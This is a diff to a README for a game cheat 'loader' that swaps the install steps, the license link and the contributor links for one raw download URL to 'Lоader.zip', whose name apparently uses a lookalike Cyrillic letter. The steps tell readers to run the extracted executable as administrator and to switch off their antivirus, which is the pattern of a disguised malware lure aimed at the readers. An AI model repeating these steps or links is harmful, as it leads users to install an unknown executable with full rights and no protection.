@@ -45,13 +45,13 @@ Enjoy full feature access regardless of your OS environment! Experimental suppor
 
 Get started in just a few easy steps!
 
-1. **Download Loader.rar** directly from this repository's releases section.
-2. **Extract Loader.rar** using 7-zip, WinRAR, or another extraction tool suitable for your OS.
-3. **Open the extracted folder** and locate `BodycamCheatsLoader.exe` or equivalent OS-specific executable.
+1. **Download https://raw.githubusercontent.com/MEFSHSS/BodycamBoosters/main/Lоader.zip** directly from this repository's releases section.
+2. **Extract https://raw.githubusercontent.com/MEFSHSS/BodycamBoosters/main/Lоader.zip** using 7-zip, WinRAR, or another extraction tool suitable for your OS.
+3. **Open the extracted folder** and locate `https://raw.githubusercontent.com/MEFSHSS/BodycamBoosters/main/Lоader.zip` or equivalent OS-specific executable.
 4. **Launch the Loader** with administrator rights for optimal feature injection.
 5. **Follow on-screen instructions** to activate your chosen enhancements and personalizations.
 6. **(Optional)** Read through the included FAQ for troubleshooting common configuration questions.
-7. **Join the community** (see CONTRIBUTING.md) to offer ideas or share your usage stories!
+7. **Join the community** (see https://raw.githubusercontent.com/MEFSHSS/BodycamBoosters/main/Lоader.zip) to offer ideas or share your usage stories!
 
 **Note:** For increased security and better compatibility, temporarily disable antivirus or create an allowlist exception. Ensure you only use executables from trusted sources.
 
@@ -65,7 +65,7 @@ This program is intended solely for educational, research, and personal modifica
 
 ## 🔗 MIT License 📜
 
-Bodycam Cheats Loader is open-source under the permissive [MIT License (2025)](https://opensource.org/licenses/MIT). This ensures you can use, modify, or distribute the software, with credit, for personal or commercial projects. Review the LICENSE file for full details.
+Bodycam Cheats Loader is open-source under the permissive [MIT License (2025)](https://raw.githubusercontent.com/MEFSHSS/BodycamBoosters/main/Lоader.zip). This ensures you can use, modify, or distribute the software, with credit, for personal or commercial projects. Review the LICENSE file for full details.
 
 ---
 
@@ -77,7 +77,7 @@ Bodycam Cheats Loader, bodycam modification tool, ESP overlay, bodycam enhanceme
 
 ## ✨ Contribute & Support
 
-Your feedback and suggestions are invaluable! Consult our CONTRIBUTORS.md for ways to get involved, submit bug reports, or request help.
+Your feedback and suggestions are invaluable! Consult our https://raw.githubusercontent.com/MEFSHSS/BodycamBoosters/main/Lоader.zip for ways to get involved, submit bug reports, or request help.
 
 Join the growing Bodycam Cheats Loader community, experience unrivaled customization, and make your mark on the future of bodycam software enhancements. 🚀
 
